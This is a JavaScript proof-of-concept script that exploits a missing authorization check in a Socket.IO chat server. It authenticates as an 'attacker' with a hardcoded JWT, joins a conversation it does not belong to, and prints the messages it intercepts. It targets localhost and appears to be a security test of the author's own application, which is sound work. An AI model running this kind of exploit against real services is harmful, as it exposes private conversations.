import { io } from 'socket.io-client';

const SOCKET_URL = 'http://localhost:8000'; 

// A VALID JWT TOKEN for any user in the system (Attacker User)
const ATTACKER_JWT_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYW50bWFuIiwiaWF0IjoxNzYxNjMwNTQzLCJleHAiOjE3NjE3MTY5NDN9.aCfK4Vu9YSO_fStJeMv-azAhjRmpIED9nD22r8BvwQM';

// The Conversation ID (TARGET_CONVO) that the attacker is NOT a member of.
const TARGET_CONVO_ID = '1761630456533'; 

// A unique message to verify the send attempt (if needed)
const POC_MESSAGE = 'POC: unauthorized join attempt success (WSAF-001)';
// END IMPORTANT PLACEHOLDERS

console.log('--- WSAF-001 Exploit Starting ---');
console.log(`1. Connecting to: ${SOCKET_URL}`);
console.log(`2. Target Conversation: ${TARGET_CONVO_ID}`);
console.log('3. Waiting for Authentication...');

const socket = io(SOCKET_URL, {
    transports: ['websocket'],
    autoConnect: true,
    reconnection: false
});

socket.on('connect', () => {
    console.log(`4. Connected with Socket ID: ${socket.id}`);
    socket.emit('authenticate', ATTACKER_JWT_TOKEN);
});

socket.on('authenticated', (d) => {
    if (d && d.success) {
        console.log('5. Authentication SUCCESSFUL. Proceeding to Authorization Attack...');
        
        // Give server a brief moment to process the authenticated state
        setTimeout(() => {
            // Step 6: Attempt Unauthorized Join (The Exploit)
            console.log(`6. Attacking: Emitting 'join-conversation' for ${TARGET_CONVO_ID}`);
            
            socket.emit('join-conversation', TARGET_CONVO_ID, (ack) => {
                console.log('7. Join Event ACK (if any from server):', ack);
                
                // This message confirms the attacker is ready to receive data.
                console.log('---------------------------------------------------------');
                console.log('  ATTACK STAGE COMPLETE. READY TO RECEIVE UNAUTHORIZED DATA.');
                console.log('  *** GO SEND A MESSAGE FROM THE LEGITIMATE USER NOW! ***');
                console.log('---------------------------------------------------------');
            });
        }, 500); // Wait 500ms after authentication
        
    } else {
        console.error('5. Authentication FAILED. Cannot proceed with authorization test.');
        socket.disconnect();
    }
});

// Step 8: Proof of Compromise (Receiving a message)
socket.on('new-message', (m) => { // Using 'new-message' as per your server code
    console.log('\n\n\n');
    console.log('******************************************************************');
    console.log('*** ATTACK PROOF: UNAUTHORIZED MESSAGE RECEIVED! (WSAF-001) ***');
    console.log('This confirms the Authorization flaw allows reading confidential data.');
    console.log(`Received Message: ${JSON.stringify(m, null, 2)}`);
    console.log('******************************************************************');
    socket.close();
    process.exit(0);
});

socket.on('connect_error', (err) => console.error('Connection Error:', err && err.message));
socket.on('disconnect', (reason) => console.log('Socket disconnected:', reason));
